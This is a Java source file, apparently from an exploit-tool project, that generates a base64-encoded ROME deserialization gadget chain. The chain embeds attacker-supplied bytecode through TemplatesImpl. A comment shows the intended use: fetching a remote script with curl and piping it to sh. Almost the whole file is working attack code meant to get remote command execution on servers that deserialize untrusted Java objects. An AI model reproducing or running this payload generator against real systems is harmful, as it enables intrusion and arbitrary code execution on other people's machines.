package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.example.asm.Resolver;
import org.example.util.Generator;
import org.example.util.SerializeUtil;

import javax.xml.transform.Templates;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;

/**
 * Hello world!
 *
 */
public class Main
{
    public static byte[] resolveTemplatesPayload(String[] command) throws Exception {
        String path = System.getProperty("user.dir") + File.separator + "a.class";
        Generator.saveTemplateImpl(path, command);
        Resolver.resolve("a.class");
        byte[] newByteCodes = Files.readAllBytes(Paths.get("a.class"));
        Files.delete(Paths.get("a.class"));

//        System.out.println(Base64.getEncoder().encodeToString(newByteCodes));
        return newByteCodes;


    }

    public static void main( String[] args ) throws Exception {

        // sh -c "curl xxx.xxx.xxx.xxx|sh"
        byte[] templatesbytes = resolveTemplatesPayload(args);
        String rome = rome(templatesbytes);
        System.out.println(rome);
        System.out.println("base64_length: "+rome.length());
    }

    public static String rome(byte[] templatesbytes) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{templatesbytes});
        SerializeUtil.setFieldValue(templates,"_name","a");

        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);

        ObjectBean objectBean = new ObjectBean(String.class,"a");

        HashMap evilMap = new HashMap();
        evilMap.put(null,null);
        evilMap.put(objectBean,null);

        SerializeUtil.setFieldValue(objectBean,"_equalsBean",equalsBean);

        byte[] bytes = SerializeUtil.serialize(evilMap);
        return Base64.getEncoder().encodeToString(bytes);
    }


}
